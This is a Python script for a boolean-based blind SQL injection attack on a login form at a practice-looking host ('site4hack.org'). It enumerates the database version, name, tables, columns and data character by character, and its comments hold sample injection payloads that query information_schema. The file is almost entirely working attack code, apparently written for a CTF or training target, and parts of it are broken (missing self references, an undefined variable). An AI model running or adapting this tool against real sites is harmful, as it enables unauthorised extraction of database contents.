import requests
from tqdm import tqdm
import json
from configparser import ConfigParser

class Bsqlibb:
	def __init__(self):
		self.cfg = ConfigParser()
		self.cfg.read("config.ini")
		self.custom_dict_bool =self.cfg.get("dictionary", "custom_dict_bool")
		self.set_dict()
		self.funcs = ["version", "database"]
		self.max_length_range=50
		self.menu = """
Welcome to blind sql injection boolean based
1. version
2. database name
3. tables (test)
4. all columns (test)
5. data (test)
>> """
		print(self.menu)
#check length of table before brute force it
#check n columns?
#uname=a&passwd=1' or 1=(select 1 order by 1)--'--&submit=Submit
#check tables for db
#or 1=exists(select table_name from information_schema.tables where table_schema = 'openhack')
	def format_dict(self, dictionary):
		for character in dictionary:
			if "-" in character:
				char = character.split("-")
				self.ascii_dict.extend(range(int(char[0])-1, int(char[1])))
			else:
				self.ascii_dict.append(int(character)-1)
		print("dictionary loaded and ready")
	def set_dict(self):
		self.ascii_dict = list()
		if self.custom_dict_bool:
			ascii_dict_cfg = self.cfg.get("dictionary", "custom_dict").split(",")
		else:
			ascii_dict_cfg = self.cfg.get("dictionary", "default_dict").split(",")
		self.format_dict(ascii_dict_cfg)

	def ascii_bf(self, host, headers, payload, func=None, **kw):
		result = list()
		# this in cfg
		found = None
		
		pbar =  tqdm(total=len(self.ascii_dict))
		for position in range(1,self.max_length_range):
			if found == False:
				print("No more characters found")
				break
			found = False
			for num in self.ascii_dict:
				pbar.set_description(f"lookin for {chr(num+1)}", refresh=True)
				query = {"uname":"a","passwd":"asdfghj{}","submit":"Submit"}
				if func:
					query["passwd"] = query["passwd"].format(payload).format(func, position, num, func, position, num+2)
				else:
					if "table" in kw:
						sel_opt = "table"
					elif "column" in kw:
						sel_opt = "column"
					elif "data" in kw:
						sel_opt = data
					query["passwd"] = query["passwd"].format(payload).format(kw[sel_opt], position, num, position, num+2)
				#print(query["passwd"])
				response = requests.post(host, data=query, headers=headers)
				
				if "flag.jpg" in response.content.decode():
					result.append(chr(num+1))
					found = True
					pbar.reset()
					break
				pbar.update(1)
		pbar.close()
		output = "".join(result)
		if len(output) < 1:
			print("empty output")
		else:
			print("output:",output)
		return output

	def table_bf(self):
		tables = list()
		#if table:
		#	table-=1
		#	tables.append(ascii_bf(host, headers, ascii_init, ascii_end, payload, table=table))
		for table in range(self.max_length_range):
			output = ascii_bf(host, headers, payload, table=table)
			if not output:
				print("No more tables found")
				break
			tables.append(output)
		for num,table in enumerate(tables):
			print(num,table)

	def column_bf(self):
		columns = list()
		for column in range(self.max_length_range):
			output = ascii_bf(host, headers, payload, column=column)
			if not output:
				print("No more columns found")
				break
			columns.append(output)
		for num,column in enumerate(columns):
			print(num,column)
	
	def data_bf(self):
		datas = list()
		for data in range(self.max_length_range):
			output = ascii_bf(host, headers, payload, data=data)
			if not output:
				print("No more data found")
				break
			datas.append(output)
		for num,data in enumerate(datas):
			print(num,data)
		
if __name__ == "__main__":

	host = 'http://site4hack.org:9980/SQLiForm/'
	headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent":"BSQLiBB/openhack by@-_-_-_-_-_"}

	bsqlibb = Bsqlibb()

	action = int(input(bsqlibb.menu))-1

	if action == 0:
		payload = bsqlibb.cfg.get("payload", "funcs")
		bsqlibb.ascii_bf(host, headers, payload, func=bsqlibb.cfg.get("funcs", bsqlibb.funcs[0]))
	if action == 1:
		payload = bsqlibb.cfg.get("payload", "funcs")
		bsqlibb.ascii_bf(host, headers, payload, func=bsqlibb.cfg.get("funcs", bsqlibb.funcs[1]))
	if action == 2:
		payload = bsqlibb.cfg.get("payload", "tables")
		bsqlibb.table_bf()
	elif action == 3:
		payload = bsqlibb.cfg.get("payload", "columns")
		bsqlibb.column_bf()
	elif action == 4:
		payload = bsqlibb.cfg.get("payload", "data")
		bsqlibb.data_bf()
